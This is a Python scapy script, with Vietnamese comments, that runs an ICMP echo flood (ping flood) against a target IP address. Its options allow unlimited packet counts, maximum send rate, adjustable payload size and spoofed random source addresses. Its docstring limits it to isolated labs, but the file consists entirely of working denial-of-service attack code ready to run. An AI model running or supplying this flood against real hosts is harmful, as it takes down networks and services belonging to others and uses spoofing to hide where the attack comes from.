#!/usr/bin/env python3
"""ICMP Echo Flood (Ping Flood L3 volumetric) - chi dung trong lab co lap."""
import sys, random, argparse, time
from scapy.all import IP, ICMP, Raw, conf

def rand_ip():
    return "10.%d.%d.%d" % (random.randint(0,255), random.randint(0,255), random.randint(1,254))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")                       # IP victim
    ap.add_argument("-c", "--count", type=int, default=0, help="so goi, 0 = vo han")
    ap.add_argument("--spoof", action="store_true", help="gia mao source IP")
    ap.add_argument("--pps", type=int, default=0,
                    help="gioi han toc do goi/giay (0 = toi da)")
    ap.add_argument("--size", type=int, default=64, help="so byte payload moi goi ICMP (mac dinh 64)")
    args = ap.parse_args()

    sock = conf.L3socket()
    payload = Raw(load=b"A" * max(args.size, 0))
    interval = 1.0 / args.pps if args.pps > 0 else 0.0
    next_t = time.perf_counter()

    sent = 0
    print("[*] ICMP Echo flood -> %s (spoof=%s, pps=%s, size=%d)" % (
        args.target, args.spoof, args.pps or "max", args.size))
    try:
        while args.count == 0 or sent < args.count:
            src = rand_ip() if args.spoof else None
            pkt = IP(src=src, dst=args.target) / ICMP(type=8, code=0) / payload
            sock.send(pkt)
            sent += 1
            if interval:
                next_t += interval
                delay = next_t - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
            if sent % 500 == 0:
                print("[*] sent %d" % sent)
    except KeyboardInterrupt:
        pass
    finally:
        try: sock.close()
        except Exception: pass
    print("[*] done, tong goi: %d" % sent)

if __name__ == "__main__":
    main()
